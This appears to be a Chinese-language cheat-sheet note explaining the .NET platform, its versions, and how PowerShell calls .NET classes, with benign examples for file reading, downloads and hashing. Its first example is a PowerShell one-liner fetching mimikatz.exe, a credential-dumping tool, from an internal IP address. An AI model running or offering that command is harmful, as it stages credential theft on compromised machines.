# .net
.NET 是微軟開發的一個軟體開發平台

## 使用範例
### powershell 使用 .net類別 下載檔案
```bash
powershell (New-Object System.Net.WebClient).DownloadFile(\"http://10.4.11.38:1234/mimikatz.exe\", \"mimikatz.exe\")
```

## 說明
**.NET 是微軟開發的一個軟體開發平台**，它讓開發者可以使用多種語言（C#, VB.NET, F# 等）寫程式，並且可以在同一個統一環境中執行、管理和存取系統資源。

我把它整理成幾個重點，方便理解：

---

### 1️⃣ 核心概念

* **平台（Framework / 平台）**：提供程式執行的環境，內含類別庫（Class Library）與執行時（CLR）。

* **CLR（Common Language Runtime）**：.NET 的「程式執行引擎」，負責：

  * 將程式碼轉成中間語言（IL → JIT → CPU 可執行碼）
  * 記憶體管理（垃圾回收）
  * 安全性檢查與例外處理

* **Base Class Library (BCL)**：.NET 提供的大量內建類別和功能，例如檔案操作、網路、加密、UI 控制等。

* **語言互通性**：不同語言寫的程式都能編譯成 IL（Intermediate Language），統一由 CLR 執行。

---

### 2️⃣ 主要版本

| 版本               | 說明                                                                     |
| ------------------ | ------------------------------------------------------------------------ |
| **.NET Framework** | 只能跑在 Windows，歷史悠久，用於桌面程式、ASP.NET 舊網站。               |
| **.NET Core**      | 跨平台（Windows, Linux, macOS），輕量、開源，適合現代 Web、API、微服務。 |
| **.NET 5/6/7/8+**  | 統一平台，整合 .NET Framework + .NET Core，跨平台，未來方向。            |
| **Mono / Xamarin** | 用於跨平台行動裝置或遊戲（Unity）開發。                                  |

---

### 3️⃣ 與 PowerShell 的關係

* **PowerShell 建立在 .NET 上**，可以直接呼叫 .NET 類別，例如：

```powershell
# 用 .NET 建立一個 WebClient 並下載檔案
$wc = New-Object System.Net.WebClient
$wc.DownloadFile("https://example.com/file.txt", "file.txt")
```

* PowerShell 的 cmdlet 其實底層也可能呼叫 .NET 類別來實現功能。

---

### 4️⃣ 舉例

* 檔案操作：

```powershell
[System.IO.File]::ReadAllText("C:\test.txt")
```

* 網路操作：

```powershell
$wc = New-Object System.Net.WebClient
$wc.DownloadFile("https://example.com/file.txt", "file.txt")
```

* 計算哈希：

```powershell
[System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes("hello"))
```


